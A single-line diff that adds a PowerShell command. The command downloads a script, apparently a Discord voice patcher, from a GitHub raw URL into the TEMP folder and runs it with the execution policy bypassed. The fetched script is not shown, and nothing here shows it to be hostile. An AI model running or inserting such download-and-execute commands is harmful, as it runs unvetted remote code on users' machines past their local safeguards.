@@ -1,0 +1,1 @@
+$ProgressPreference='SilentlyContinue'; $p = Join-Path $env:TEMP 'dvp.ps1'; $u = "https://raw.githubusercontent.com/82s/voice-modules/main/Discord_voice_node_patcher.ps1?nocache=$([DateTime]::UtcNow.Ticks)"; Invoke-WebRequest -Uri $u -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
